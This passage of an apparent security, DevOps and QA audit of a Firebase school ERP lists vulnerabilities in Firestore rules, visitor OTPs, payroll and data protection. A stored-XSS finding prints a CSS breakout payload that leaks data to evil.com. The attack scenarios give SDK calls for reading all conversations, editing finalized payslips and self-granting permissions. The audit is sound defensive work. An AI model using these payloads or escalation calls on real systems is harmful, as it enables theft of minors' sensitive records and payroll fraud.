**`serviceAccount.json` contains a live Firebase Admin SDK private key** (`private_key_id: 047ae6d8219d8da840d463c32e4bfb1777157c86`). The `.gitignore` correctly excludes it from git, and it has never been committed — but the key exists in plaintext on disk. The risk: if this developer machine is compromised, an attacker gains **full Admin SDK access** — bypassing ALL Firestore security rules, reading every school's POCSO cases, medical records, payslips, and parent/student PII without any limitation.

**Immediate action required: Rotate this service account key in the Firebase Console now, before any further work.**

---

#### Critical Vulnerabilities

**CRIT-1: No Firebase App Check — Unauthenticated API Access**

`src/lib/firebase.ts` initializes Firebase with no App Check. The Firebase API key is embedded in the compiled JavaScript bundle in plaintext. Without App Check, any attacker can:
1. Extract the API key from built JS (trivial with browser DevTools)
2. Use the Firebase REST API or SDK directly against production Firestore
3. The only remaining barrier is the Firestore security rules

This means the security rules are the **single layer of defense** against the entire internet. For a system holding POCSO cases and medical records of minors, single-layer defense is not acceptable.

**CRIT-2: Service Account Private Key on Disk**

`serviceAccount.json` in the project root contains a full RSA private key and `client_email: firebase-adminsdk-fbsvc@nexli-erp.iam.gserviceaccount.com`. The Admin SDK bypasses ALL Firestore security rules. An attacker with this key can read/write/delete any data in the entire `nexli-erp` project — every school's POCSO cases, all medical records, all payroll data, all parent phone numbers.

**CRIT-3: Messaging Collections Have No Dedicated Firestore Rules**

The `firestore.rules` file has no `match /conversations/` or `match /messages/` rules. These fall through to the generic tenant wildcard:

```
match /{collection}/{docId} {
  allow read: if !isRestrictedCollection(collection) && isActiveMember(schoolId);
  allow write: if !isRestrictedCollection(collection) && isStaff(schoolId);
}
```

`conversations` and `messages` are not in `isRestrictedCollection()`. This means:

- **Any active member** (including parents, students) can **read ALL conversations and ALL messages** in the school — not just their own threads. A parent can read a private conversation between a class teacher and the principal about a POCSO referral.
- **Any staff member** can write to any conversation or message document, including forging messages from other users' UIDs (the `senderUid` field is a plain field, not enforced against `request.auth.uid`).

**CRIT-4: Vendor, Expense, and Finance Collections Have No Dedicated Rules**

The following collections fall through to the generic wildcard (any staff can write, any active member can read): `vendors`, `expenses`, `requisitions`, `purchase_orders`, `goods_receipts`, `compliance_items`, `compliance_documents`, `rte_applications`, `rte_claims`, `smc_members`, `smc_meetings`, `smc_budget`, `udise_profile`, `visitor_logs`, `visitor_blacklist`, `visitor_passes`, `fee_heads`, `fee_structures`, `finance_settings`. None appear in `isRestrictedCollection()`. A parent can read all vendor contracts and expense records.

**CRIT-5: Cryptographically Weak Visitor OTP**

`src/features/visitor/visitorSchema.ts` line 35:
```typescript
export function generateOtp(): string {
  return String(Math.floor(1000 + Math.random() * 9000));
}
```

`Math.random()` is not a cryptographically secure PRNG. With only 9,000 possible values (1000–9999) and a predictable V8 seed, brute-force enumeration of the OTP space is trivial. The OTP is used to verify visitors — a compromised OTP allows a blacklisted person to claim a legitimate check-in code.

**CRIT-6: Pass Number Collision on Same-Second Check-Ins**

`src/features/visitor/visitorSchema.ts` lines 27–31 generate `V-${ymd}-${tail}` where `tail = (hours*3600 + minutes*60 + seconds) % 10000`. Two check-ins within the same second produce identical pass numbers. At a busy school gate, this is realistic. Identical pass numbers are a security failure — a guard cannot distinguish the legitimate pass from a spoofed one.

**CRIT-7: Blacklisted Visitor Check-In Is Not Blocked**

`src/features/visitor/VisitorCheckInPage.tsx` lines 85–108: the blacklist match is shown as a warning banner but the form submission is not blocked. The code calls `createVisitor(schoolId, payload, actor)` unconditionally regardless of a blacklist match. A court-restricted person will be allowed physical entry with a valid gate pass.

---

#### Authentication and Authorization Gaps

**AUTH-1: Delegation is UI-Only**

The `Guarded` component waives the permission check when `delegatedModules.includes(moduleKey)`. The Firestore rules have no delegation awareness. A delegated user who gains UI access to the medical module can call the Firestore SDK directly (CRIT-1: no App Check) to read medical records without the delegation gate.

**AUTH-2: Secondary Role Permissions Not Enforced in Firestore Rules**

The Firestore rules only call `myRole(sid)` which reads `memberData(sid).roleId` — the primary role only. Secondary role permissions are merged client-side but not enforced at the database layer. This creates a split-brain: the UI grants access the database denies, or vice versa.

**AUTH-3: `grantedPermissions` Field Is Self-Writable**

`src/app/providers/SessionProvider.tsx` line 164: `state.member?.grantedPermissions` is included in the `can()` check. The member self-update rule (lines 254–257 of `firestore.rules`) allows self-updates without changing `roleId`, `status`, or `schoolId`. The `grantedPermissions` field is not excluded. A user who knows their UID can issue a Firestore `updateDoc` on their own member doc to add any permission strings to `grantedPermissions`. Combined with CRIT-1 (no App Check), this is a full privilege escalation path.

**AUTH-4: `userIndex` Can Be Written by Any `isSchoolAdmin`**

`firestore.rules` lines 224–227: a school admin can write to any `userIndex` document as long as the written `schoolId` is a string and they are `isSchoolAdmin` of that schoolId. A principal of School A can create a `userIndex` entry for an arbitrary UID pointing to School B if they know School B's ID.

**AUTH-5: Students Can Read All Other Students' Academic Records**

`attendance_days`, `assessment_results`, `exam_results`, and `hpc_cards` store whole-class data. The rule `allow read: if isSuperAdmin() || isActiveMember(schoolId)` means a student (active member) can read all other students' attendance records and exam scores. Acknowledged as "Danger 2 deferred" in the rules but not addressed.

---

#### Data Protection Failures (Minors)

**DATA-1: No CSP Headers — XSS Can Exfiltrate POCSO/Medical Data**

`firebase.json` has no `Content-Security-Policy` header. An XSS vector combined with no CSP means a malicious script can freely read Firestore data via the JS SDK and exfiltrate it to an external endpoint.

**DATA-2: Stored XSS in Certificate Preview**

`src/features/certificates/CertificatePreview.tsx` line 99:
```tsx
<div dangerouslySetInnerHTML={{ __html: certBodyHtml(opts) }} />
```

`certBodyHtml` injects `opts.accentColor` (from user-controlled school settings) into a CSS property value string with only `.trim()` and no further sanitization. A school admin can inject `red; } body { display: none; } .evil { background: url(https://evil.com/?s=` to break out of the inline style. This is a stored XSS vector targeting all users who view certificates for that school.

**DATA-3: Counseling Sessions Are Deletable**

`src/features/counseling/data.ts` line 76: `deleteCounselingSession` calls `deleteDoc`. The Firestore rules allow `write` (which includes delete) for counselors. A rogue counselor can permanently delete confidential counseling session records. Under POCSO and mental health best practices, these records must be retained for defined periods.

**DATA-4: Medical Records Have No Per-Student Scoping**

Any nurse/doctor can read/write ALL medical records across the school — there is no per-student scoping. A visiting nurse assigned to one block can read the medical history of every student.

**DATA-5: POCSO Case Number Is Non-Unique and Sequential**

`safeguardingNumber('PC', cases.length)` uses client-side count. Two CPOs creating a case simultaneously generate the same case number. For POCSO cases, duplicate case numbers are a compliance failure — case numbers are referenced in mandatory reports to NCPCR/DCPU and court proceedings.

---

#### Financial Security Issues

**FIN-1: Fee Amount Can Be Set Arbitrarily Low**

There is no server-side minimum amount check, no maximum check against the invoice's due amount for general payments, and no second-eye approval for fee payments. A single `canWrite` accounts staff member can record arbitrary payment amounts.

**FIN-2: Payroll Separation of Duties Is Client-Side Only**

`approvePayrollRun()` checks `submittedByUid === a.uid` in the JS function. The Firestore rule for `payroll_runs` is `allow read, write: if isSuperAdmin() || isPayrollStaff(schoolId)`. Any payroll staff member can write `{ status: 'finalized' }` directly to a payroll run via the SDK, bypassing the approval check entirely.

**FIN-3: Payslip Data Can Be Modified After Approval**

Once a payroll run is approved (`status: 'finalized'`), the Firestore rule still allows any `isPayrollStaff` member to `updateDoc` on a `payslip` document. An accountant can inflate a salary figure in a finalized payslip.

---

#### Compliance Violations

**COMP-1: No Consent Gate Before Processing Personal Data (DPDP Act 2023)**

The consent module stores consent records but there is no enforcement that personal data is processed only after consent is recorded. Student registration, medical records, and messaging all process personal data without checking consent state. The DPDP Act 2023 Section 6 requires valid consent before processing.

**COMP-2: POCSO Mandatory Reporting Not Automated (POCSO Act 2012, Section 19)**

Section 19 requires mandatory reporting to the Special Juvenile Police Unit within 24 hours. The system records cases but has no 24-hour SLA alert, no automated notification to authorities, and no mandatory field for reporting status.

**COMP-3: Sensitive Personal Data Stored Without Application-Level Encryption**

Counseling session notes, POCSO case descriptions, medical conditions and medications — all stored as plaintext Firestore strings. Firebase provides infrastructure-level encryption at rest, but a service account key leak (CRIT-2) exposes all data in plaintext. The IT Act Sections 43A and 72A impose liability for negligent data handling.

**COMP-4: Data Retention/Deletion Policy Not Implemented**

Under DPDP Section 8(7), personal data must be erased when the purpose is fulfilled. There are no automated data retention policies, no student data deletion on TC issuance, and no parent data purge on de-enrollment.

**COMP-5: Audit Log Does Not Cover Sensitive Reads**

The `AuditAction` type covers fee payments, attendance, grades, and consent writes, but is missing: medical record reads, POCSO case reads, counseling session reads, payslip reads, and parent login events.

**COMP-6: No Data Localisation Guarantee**

Firebase Analytics (`measurementId: G-SBJ6Q5DEDF`) sends data to Google servers potentially outside India. Under DPDP, student personal data (minors' data) may not be transferred outside India without explicit consent.

---

#### Infrastructure Security

**INFRA-1: No Security Headers**

`firebase.json` has no `Content-Security-Policy`, no `X-Frame-Options`, no `X-Content-Type-Options`, no `Strict-Transport-Security`, no `Referrer-Policy`, and no `Permissions-Policy`. The app can be iframed for clickjacking against logged-in CPOs who manage POCSO cases.

**INFRA-2: Persistent IndexedDB Cache Stores Sensitive Data Offline**

`persistentLocalCache` stores POCSO cases, medical records, counseling notes, and payslip data in the browser's IndexedDB indefinitely. `clearIndexedDbPersistence` is never called on logout. A shared or stolen computer exposes the last-synced sensitive data without authentication.

**INFRA-3: No Rate Limiting on Write Operations**

All Firestore writes go through the Firebase SDK with no application-level rate limiting on fee payments, medical record creation, or message sending. A compromised accounts staff account can flood the database.

---

#### Attack Scenarios

**Scenario A: Teacher Reads All POCSO Cases**
1. Teacher logs in normally
2. Opens DevTools, queries: `getDocs(collection(db, 'schools/X/conversations'))`
3. Gets ALL conversations — no rule restricts this (CRIT-3)
4. Reads all message threads between CPO and principal about POCSO referrals
5. No audit event generated (reads are not audited)

**Scenario B: Accounts Clerk Commits Payroll Fraud**
1. Accountant (role: `accountant_senior`) has `isPayrollStaff = true`
2. Opens Firestore directly (no App Check), finds a finalized payroll run
3. Issues: `updateDoc(payslipRef, { netPay: 999999 })`
4. Firestore rule allows this — `isPayrollStaff` has write access to `payslips`
5. No second-eye check catches the altered payslip amount

**Scenario C: Self-Privilege Escalation**
1. Staff member (role: `lab_assistant`) authenticates normally
2. Calls: `updateDoc(memberRef(schoolId, uid), { grantedPermissions: ['pocso.read', 'medical.write', 'payroll.write'] })`
3. Member self-update rule allows this (roleId/status/schoolId unchanged)
4. On next page load, `SessionProvider` includes `grantedPermissions` in `can()` check
5. Lab assistant now has read access to POCSO cases

**Scenario D: External Attacker via Service Account**
1. Attacker gains `serviceAccount.json` (phishing, social engineering, or a CI/CD system that had it committed)
2. Uses Admin SDK: `admin.firestore().collection('schools').get()`
3. Reads all schools, all students (Aadhaar last-4, addresses, parent phones), all POCSO cases, all payroll data
4. Security rules are completely bypassed
5. No alert or detection mechanism triggers

---

#### Missing Security Controls

1. Firebase App Check (reCAPTCHA Enterprise)
2. Content-Security-Policy header
3. Firestore rules for `conversations` and `messages` (with participant-only read)
4. `grantedPermissions` excluded from member self-write
5. Payroll run status transitions enforced in Firestore rules
6. Blacklist blocking at form submission level
7. Cryptographically secure OTP (`crypto.getRandomValues`)
8. IndexedDB cleared on logout
9. POCSO 24-hour mandatory reporting SLA with alerting
10. Audit log for reads of POCSO, medical, counseling, and payslip data
11. DPDP consent enforcement gate
12. Data retention and deletion automation
13. Firebase Analytics review for DPDP data localisation compliance
14. Role-definition write gate (prevent school-level principals from editing role schemas)

---

#### Security Remediation Plan

**P0 — Immediate (before any data is entered by real schools)**

- Rotate the service account key: Firebase Console → Service accounts → Revoke `047ae6d8...` → Generate new key → Store in secrets manager. ETA: 30 minutes.
- Enable Firebase App Check with reCAPTCHA Enterprise. ETA: 2 hours.
- Block `grantedPermissions` from self-write: add `&& request.resource.data.grantedPermissions == resource.data.get('grantedPermissions', [])` to member self-update rule. ETA: 15 minutes.
- Block blacklisted visitor check-in at form level. ETA: 30 minutes.

**P1 — Before First School Onboarding**

- Add Firestore rules for `conversations` and `messages` with participant-only read:
```
match /conversations/{convId} {
  allow read: if isActiveMember(schoolId)
    && request.auth.uid in resource.data.participantUids;
  allow create: if isActiveMember(schoolId)
    && request.auth.uid in request.resource.data.participantUids;
  allow update: if isActiveMember(schoolId)
    && request.auth.uid in resource.data.participantUids;
  allow delete: if false;
}
```
- Add security headers to `firebase.json` (CSP, X-Frame-Options, nosniff, HSTS, Referrer-Policy).
- Add `conversations`, `messages`, `vendors`, `expenses`, `requisitions`, `purchase_orders`, `goods_receipts`, `smc_members`, `smc_meetings`, `smc_budget`, `compliance_items`, `compliance_documents`, `udise_profile`, `rte_applications`, `rte_claims` to `isRestrictedCollection()`.
- Add dedicated Firestore rules for vendor/expense/procurement collections.
- Clear IndexedDB on logout.
- Replace `Math.random()` OTP with `crypto.getRandomValues`.

**P2 — Before First Real Data Entry**

- Enforce payroll run status transitions in Firestore rules.
- Implement POCSO 24-hour mandatory reporting SLA.
- Audit reads of POCSO, medical, counseling, and payslip data.
- Add DPDP consent enforcement gate.
- Validate `accentColor` against `/^#[0-9A-Fa-f]{6}$/` before injecting into certificate preview style.

**P3 — Compliance Hardening**

- Field-level encryption for POCSO case summaries and medical conditions
- Move user provisioning to Cloud Functions with Admin SDK
- Per-student scoping for academic records
- Firebase Analytics review for DPDP data localisation
- Rate limiting on write-heavy endpoints
- Independent penetration test before full multi-school rollout

---

**Key Files Referenced:**

| File | Issue |
|------|-------|
| `serviceAccount.json` | Live Admin SDK private key — rotate immediately |
| `firestore.rules` | Missing conversation/message rules; grantedPermissions self-write |
| `firebase.json` | Missing all security headers |
| `src/lib/firebase.ts` | App Check not initialized |
| `src/features/visitor/visitorSchema.ts:35` | Math.random() OTP |
| `src/features/visitor/VisitorCheckInPage.tsx:60–68` | Blacklist not blocking |
| `src/app/providers/SessionProvider.tsx:162–175` | grantedPermissions in can() |
| `src/features/certificates/CertificatePreview.tsx:99` | dangerouslySetInnerHTML with user input |

---

### ROLE 9 — DEVOPS ENGINEER

**Score: 3 / 10**
**Verdict:** The application code quality is significantly better than the infrastructure. The gap is entirely in operational tooling: monitoring, CI/CD, security headers, backup, and Spark tier quota risk.

---

#### Build System Assessment — 6/10

The build pipeline is clean (`tsc --noEmit && vite build`) and the Vite 6 + React 19 + TypeScript 5.7 stack is current. Chunk splitting manually separates Firebase, router, react, and vendor chunks.

**Gaps:**

1. `sourcemap: true` in production (`vite.config.ts` line 49). Source maps expose the full application source code to anyone who opens DevTools. Change to `sourcemap: false` or `'hidden'`.

2. `chunkSizeWarningLimit: 900` (line 51) raised the threshold to suppress warnings rather than addressing chunk size. No dynamic import / lazy loading at the route level — the entire app boots on first load. The comment in `vite.config.ts` line 54 says "Per-route code-splitting is added as the router grows" — it has not been added.

3. No `dropConsole` configuration — console statements from development appear in production bundles.

4. No staging/preview build target — one `vite.config.ts` covering dev and prod with no environment-specific overrides.

5. `manualChunks` uses a `vendor` catch-all for all `node_modules`. Leaflet alone is heavy and should be isolated since it only loads on transport/map pages.

---

#### PWA Configuration — 5/10

The `vite-plugin-pwa` setup is minimal. The manifest is correctly defined. `registerType: 'autoUpdate'` is acceptable for a managed school tool.

**Critical gaps:**

1. **No `runtimeCaching` strategy defined.** The `workbox` config only sets `globPatterns` for static assets. Zero runtime cache strategies. Going offline shows a blank screen, not a cached last-known-good state. The app claims to be "offline-first" but the service worker provides no network-fallback for dynamic data.

2. **Push notifications are a feature flag** (`push_notifications` in `featureFlags.ts`) but there is **no FCM (Firebase Cloud Messaging) initialization** anywhere in the codebase. The flag infrastructure exists; the implementation does not.

3. **No `maskable` icon path in `includeAssets`** — `icon-512-maskable.png` is referenced in the manifest but `includeAssets` only lists `['favicon.svg']`. Fragile if `public/` handling changes.

---

#### Firebase Infrastructure Assessment — 4/10

**Project:** `nexli-erp` on Spark (free) tier, Firestore in India region.

**Hosting config (`firebase.json`):**
- SPA rewrite rule is correct.
- Static assets get `max-age=31536000, immutable` — correct for hashed Vite output.
- `index.html` gets `no-cache` — correct.
- **No CSP header.** No `X-Frame-Options`. No `X-Content-Type-Options`. No HSTS. No `Referrer-Policy`.

**Spark tier risk — Critical:**

The free tier limits: 50,000 Firestore reads/day, 20,000 writes/day, 1 GB storage, 10 GB Hosting bandwidth/month.

The Firestore rules use `get()` 5 times and `exists()` 2 times. Each `get()`/`exists()` call in security rules evaluation burns a read. A single authenticated request triggers rule lookups:

- 500 users × 10 page loads × 5 rule reads = 25,000 reads just from rule overhead before any actual data
- Adding dashboard, attendance, and fee list reads: a 200-student school hits the 50K limit by mid-morning

**When the free tier is hit: Firebase silently returns `resource-exhausted` errors.** There is no quota monitoring, no alerting, and no fallback. Users see cryptic errors with no explanation.

**No staging environment.** There is one project (`nexli-erp`). Demo seeding scripts run against production.

---

#### Environment and Secrets Management — 5/10

**Good:** `.env` is gitignored. `.env.example` is committed and clean. `.gitignore` has comprehensive patterns for `serviceAccount.json`.

**Critical active risk:** `serviceAccount.json` **exists in the working directory** with a full Firebase Admin SDK private key for project `nexli-erp`. This file has full admin access to Firestore (bypasses all security rules) and Firebase Auth (can create/delete any user). The `.gitignore` protection is correct, but the file should not exist on disk in plain form for day-to-day development. Use Google Application Default Credentials (`gcloud auth application-default login`) instead of a downloaded key file.

---

#### CI/CD Pipeline Status — 1/10

There is no `.github/` directory, no `Makefile`, no CI configuration of any kind. All deployment is manual.

The deploy scripts in `package.json`:
```
"deploy:rules": "firebase deploy --only firestore:rules,firestore:indexes"
"deploy:hosting": "npm run build && firebase deploy --only hosting"
"deploy": "npm run build && firebase deploy"
```

**Problems:**
- No automated tests run before deploy. The rules test (`npm run test:rules`) is never invoked in the deploy script.
- No branch protection. No PR required before deploy.
- Deploying rules and hosting simultaneously means a bad rules push takes down all production data access at the same moment the new client code goes live — two failure modes combined.
- No deploy preview URLs.
- No rollback procedure documented or scripted.

---

#### Monitoring and Alerting — 1/10

- **No error tracking** (no Sentry, LogRocket, Datadog, or any equivalent). JavaScript errors in production are invisible.
- **No React ErrorBoundary.** Zero results for `ErrorBoundary` or `componentDidCatch` across all `.tsx` files. One unhandled React render error crashes the entire application with a white screen and no recovery path.
- **No Firebase Performance Monitoring.** `measurementId` is set but `getPerformance()` is never called.
- **No uptime monitoring.**
- **No Firebase quota alerts.**

---

#### Disaster Recovery — 2/10

- **No Firestore export/backup configured.** Firestore point-in-time recovery and scheduled exports require Blaze tier. On Spark tier, there is no automated backup. If data is corrupted or accidentally deleted, it is gone.
- **No manual backup documented or scripted.**
- **Firebase Hosting rollback** is the only working rollback mechanism — covers the static frontend only, not data.
- **No Firestore rules version pinning.** If a bad rules push locks everyone out, recovery requires manually reverting the file and re-running the script.

---

#### Firestore Indexes Analysis — 3/10

`firestore.indexes.json` contains exactly **2 composite indexes**:
1. `members`: `roleId ASC, name ASC`
2. `audit_log`: `actorUid ASC, ts DESC`

The codebase has 321 Firestore query operations across 103 files. Many use `where` + `orderBy` combinations which **require composite indexes**. Firestore throws a runtime error (not a build-time error) for missing indexes.

Queries that will fail at runtime without composite indexes:
- `portfolio` collection: `orderBy('createdAt', 'desc')` — not in indexes
- `fee_payments` with `where('studentId') + orderBy('createdAt')` — composite needed
- IT admin audit: `orderBy('ts', 'desc') + limit` on `it_audit` collection (not covered by existing `audit_log` index)
- Platform activity: `orderBy('ts', 'desc') + limit` on `platformActivity.ts`

The correct practice: run queries during development with the Firebase emulator, collect all missing-index URLs from the console, and add them to `firestore.indexes.json` before launch.

---

#### Dependency Security — 6/10

`npm audit` reports 9 moderate severity vulnerabilities, all in `firebase-admin` (a devDependency used only in local scripts). The `firebase` client SDK (production dependency) has **zero vulnerabilities**. These do not affect deployed production code.

**Package currency:**
- `firebase ^11.3.0` — current
- `react ^19.0.0` — current
- `vite ^6.1.0` — current
- `typescript ^5.7.3` — current

---

#### Top 12 DevOps Actions

**P0 — Immediate (Pre-Any-User)**

1. **Add a React ErrorBoundary** at the root in `src/app/providers/AppProviders.tsx`. 30 minutes. Without it, one render error = white screen for the entire school.

2. **Add security headers to `firebase.json`** — minimum: `Content-Security-Policy`, `X-Frame-Options: DENY`, `X-Content-Type-Options: nosniff`, `Strict-Transport-Security`, `Referrer-Policy: strict-origin-when-cross-origin`.

3. **Disable production source maps** — change `sourcemap: true` to `sourcemap: false` in `vite.config.ts:49`.

4. **Move `serviceAccount.json` off the developer machine** — revoke key in Firebase Console, configure Application Default Credentials (`gcloud auth application-default login`) for script use.

**P1 — Before First School Tenant**

5. **Set up Firebase quota alerting** — alert at 35,000 reads/day, 15,000 writes/day. Free, 20 minutes. Without it, the first real school hits the quota silently.

6. **Upgrade to Blaze (pay-as-you-go) with a budget cap** — set GCP billing budget alert at ₹500/month. Unlocks: Firestore scheduled exports, Cloud Functions, App Check enforcement. `persistentMultipleTabManager` requires Blaze.

7. **Add missing Firestore composite indexes** — run a full emulator session exercising every major query path, capture all missing-index URLs, add to `firestore.indexes.json`.

8. **Implement Firebase App Check** with reCAPTCHA Enterprise in `src/lib/firebase.ts` — the seam is already documented in the file's comment.

**P2 — Before Multi-School Launch**

9. **Add Sentry error monitoring** — install `@sentry/react`, initialize in `src/main.tsx`, wrap `AppProviders` with `Sentry.ErrorBoundary`. Upload source maps to Sentry privately instead of serving them publicly.

10. **Add a minimal CI/CD pipeline** — GitHub Actions jobs: typecheck → test:rules → deploy (only on `main`). Separate rules deployment from hosting deployment.

11. **Implement Firestore scheduled exports** — after upgrading to Blaze, create a Cloud Scheduler job running daily: `gcloud firestore export gs://nexli-erp-backups/$(date +%Y%m%d)`. Set 30-day lifecycle policy on the bucket.

12. **Implement route-level lazy loading** — wrap each route component in `React.lazy()` with dynamic `import()`. 55+ modules currently bundle together. Lazy loading reduces initial bundle size by an estimated 60–70%, directly improving Time to Interactive on 4G connections common in Indian school contexts.

---

**Infrastructure Action Summary:**

| Action | Effort | Impact |
|--------|--------|--------|
| React ErrorBoundary | 30 min | Critical (crash prevention) |
| Security headers | 1 hr | Critical (DPDP compliance) |
| Disable production source maps | 5 min | High (data exposure) |
| Remove serviceAccount.json | 15 min | Critical (key compromise) |
| Firebase quota alerts | 20 min | High (availability) |
| Upgrade to Blaze + budget cap | 30 min | Critical (viability) |
| Missing Firestore indexes | 2 hrs | High (runtime errors) |
| Firebase App Check | 2 hrs | High (security) |
| Sentry error monitoring | 2 hrs | High (observability) |
| GitHub Actions CI/CD | 4 hrs | High (reliability) |
| Firestore scheduled backups | 2 hrs | Critical (disaster recovery) |
| Route-level lazy loading | 4 hrs | Medium (performance) |

---

### ROLE 10 — QA LEAD

**Score: 2 / 10**
**Verdict:** Real-user data will be at risk from day one. The complete absence of a unit test runner, zero coverage of any pure computation function, two Critical state corruption risks, and zero React error boundaries mean that bugs in financial calculations, report card grading, and RTE lottery fairness will reach production undetected.

---

#### Test Coverage Assessment

**What exists:**
One file: `test/rules.test.mjs` — a Firestore Security Rules integration test using the Firebase emulator. It covers 92 assertions across 19 role types, testing read/write grants and denials for tenant isolation, RBAC boundaries, parent child-scoping, certificate issuer allowlists, career assessment access, and consent.

**What is completely absent:**
- No unit test runner at all (no Vitest, Jest, or any equivalent in `package.json`)
- Zero component tests (`@testing-library/react` is not installed)
- Zero unit tests for any pure business-logic function
- Zero integration tests for the Firebase data layer (write paths, transactions)
- Zero end-to-end tests (no Playwright, Cypress, or similar)
- No snapshot tests

**Coverage by module — all zero:**

| Module | Coverage |
|--------|----------|
| `reportcard/compute.ts` — report card math | 0% |
| `career/scoring.ts` — RIASEC scoring | 0% |
| `gamification/engine.ts` — XP engine | 0% |
| `fees/feeSchema.ts` — fee calculations | 0% |
| `payroll/salarySchema.ts` — payroll computation | 0% |
| `students/import/validate.ts` — CSV validation | 0% |
| All 30+ Zod schemas | 0% |
| `rte/ApplicationsTab.tsx` — lottery algorithm | 0% |
| `finance/data.ts` — state machine transitions | 0% |

---

#### Critical Untested Flows

1. **Fee payment recording (money flow)** — `recordPayment()` uses a Firestore transaction that atomically increments a receipt counter, writes the payment, and updates the invoice. The transaction is never tested. A failure at any step leaves Firestore in an inconsistent state with no compensation logic.

2. **Report card generation batch** — `buildBatch()` + `generateReportCards()` computes subjects, totals, CGPA, and ranks for an entire class. If `autoFillSubjects` mismatches exam papers to assessment components, every student in the class gets wrong grades on their official document.

3. **RTE lottery draw** — `doRunLottery()` uses Fisher-Yates and `Promise.all` to bulk-update all applications. No test verifies the shuffle is uniform, that ranks are unique, or that a partial failure is handled. A network failure mid-`Promise.all` leaves applications with mixed states permanently.

4. **Student bulk import** — `runImport()` fires sequential `createStudent()` calls. Duplicate admission numbers are not detected. A re-import of the same CSV creates duplicates silently.

5. **Payroll run approval (separation of duties)** — `approvePayrollRun()` enforces that the submitter cannot approve their own run. This logic is client-side only (not enforced by Firestore rules). A direct SDK call can approve a self-submitted run.

6. **Attendance and report card linkage** — `computeAttendance()` is called with attendance days from the caller. If the caller filters incorrectly (wrong term, wrong section), the attendance percentage on the official report card is wrong with no runtime error.

---

#### Edge Case Analysis

**Scenario 1: Student with no section assigned → attendance**
The student never appears in any roster. No warning is shown to teachers that some students are untracked. Goes into report card as 0/0 = 0% attendance.

**Scenario 2: Fee invoice with ₹0 netAmount**
`statusFor(0, 0)` returns `'paid'`. A ₹0 invoice is created and immediately shows as "Paid" — causes clutter and masks errors.

**Scenario 3: Student transferred mid-year → report card**
The report card computation depends entirely on which section's data the caller picks. A transferred student appearing in two sections across a term has unspecified behavior. Can get incorrect grades or be silently excluded from the batch.

**Scenario 4: Duplicate student import (same CSV)**
No de-duplication query against existing students before writing. Two students with identical names and DOBs are created, receiving different auto-generated admission numbers. Corrupts fee ledgers, attendance registers, and report cards permanently.

**Scenario 5: RTE lottery with browser close mid-run**
`doRunLottery()` fires `Promise.all` of independent writes. Browser close mid-`Promise.all` leaves some applications with `stage: 'lottery'` and a rank, while others remain `stage: 'applied'`. Re-running the lottery only picks up `stage: 'applied'` applications, so partially-ranked applications are permanently stranded. **There is no recovery UI.** This constitutes a violation of RTE Act Section 12(1)(c) — the lottery is legally mandated.

**Scenario 6: Same teacher on 2 devices simultaneously**
Both tabs see the same Firestore state via `onSnapshot`. Attendance saves use `setDoc` (overwrite). Two teachers marking the same section simultaneously: last write wins with no conflict detection. Silent data loss.

**Scenario 7: Internet cut during fee payment**
`recordPayment()` uses `runTransaction()`. Firebase offline persistence queues the transaction and retries on reconnect. If the user refreshes before sync completes, the transaction is lost. The UI shows a generic error with no "it will sync" message — inconsistent with the attendance handler which correctly promises sync. The user may retry, causing a double payment attempt.

**Scenario 8: Student with no exam marks → report card**
An exam with no marks entered produces `computeTotals` returning `{obtained: 0, max: 0, percentage: 0}`. The student gets 0% for that term with no warning.

**Scenario 9: Parent with 2 children in same school**
`member.childStudentIds` is an array; fee invoices are queried separately per studentId. Appears to work from code review. However, the `rules.test.mjs` only tests a single-child parent — the multi-child Firestore rule (`studentId in resource.data.childStudentIds`) is untested for the multi-child case.

**Scenario 10: Concurrent attendance marking by two users on same section**
Last-write-wins is documented Firebase behavior but produces silent data loss. One teacher's attendance is completely overwritten by the other's. No locking, no conflict detection, no merge.

---

#### Validation Gap Analysis

**`feeSchema.ts`:**
- `itemSchema.amount` allows `>= 0` — a ₹0 fee line item is valid
- No uniqueness check on `headId` within a structure — same fee head can be added twice
- `studentCategory` enum is hard-coded and does not reference the actual `FeeCategory` type — schema drift risk

**`examSchema.ts`:**
- No minimum gradeIds required — an exam with no assigned grades is valid
- No validation that `startDate < endDate`
- No minimum max-marks validation — a paper with 0 max marks causes `percentage = max > 0 ? ...` guard to return 0%, masking the root cause

**`rteSchema.ts`:**
- `phone` is optional; empty string passes
- `annualIncome` allows any non-negative number — no cap prevents ₹100,000,000 income on an EWS application
- No cross-field validation: `category: 'ews'` with high annual income passes without a warning

**`studentSchema.ts`:**
- `dob` is optional with no age range validation — DOB in the future or making student 99 years old passes
- `admissionNo` requires min length 1 but no format validation or uniqueness check at schema level
- `guardian.name` requires `min(1)` but accepts a space-only string (no `.trim()`)

**`validate.ts` (student import):**
- No admission number uniqueness check against existing students
- No future-date check on DOB
- No phone format validation on `guardianPhone`
- Roll number (`rollNo`) accepted as a free string with no uniqueness or format check

---

#### Error State Coverage

**Well-handled:**
- `MarkAttendancePage`: try/catch with "It will sync when you are back online" toast
- `SessionProvider`: catches `loadProfile` failure and falls back to `no_profile` state
- `OverviewTab` (fees): renders `<EmptyState>` on error

**Gaps:**
- `CollectPaymentPage` catch block: `catch { toast.error('Could not record payment', 'Please try again.') }` — no "will sync" messaging. User may retry, creating a double payment attempt if the first write eventually syncs.
- `doRunLottery()` catch: if some writes succeeded before the failure, re-running creates duplicate ranks with no cleanup mechanism.
- `StudentImportPage.runImport()`: per-row failures are caught and logged to `reasons[]` but not surfaced to the user on the done screen. The user sees "X students added, Y skipped" with no way to see which rows failed.
- **Zero React error boundaries** in the entire codebase. A runtime JS error in any feature component crashes the app with a blank white screen.
- `generateReportCards()` — if a Firestore write fails for one student, the entire batch is abandoned. No partial-success handling.

---

#### State Machine Analysis

**Invoice status (`unpaid → partial → paid → cancelled`):**
- `statusFor(net, paid)` is a pure function with correct transitions
- `cancelInvoice()` does not check current status — a `paid` invoice can be cancelled (money already collected). No guard exists.
- A concession applied after payment (where `paid > 0`) can push `netAmount` below `paidAmount`, making `statusFor` return `paid` with no `overpaid` state or refund workflow

**RTE application stages:**
- `transition()` does not validate that the source stage is a valid predecessor — guarded by UI only
- `lotteryRank: undefined` in the patch is silently dropped by `stripUndefined()` in the data layer. A reopened application retains its old lottery rank invisibly in Firestore.

**Payroll run (`draft → awaiting → finalized → paid`):**
- "Awaiting" state is derived at runtime from `submittedAt` field — never persisted as a status string. A query for "runs awaiting approval" requires a client-side join of status + submittedAt.
- `approvePayrollRun()` reads then writes without a transaction — two approvers can double-approve.

---

#### Missing Test Infrastructure

To build a proper test suite:
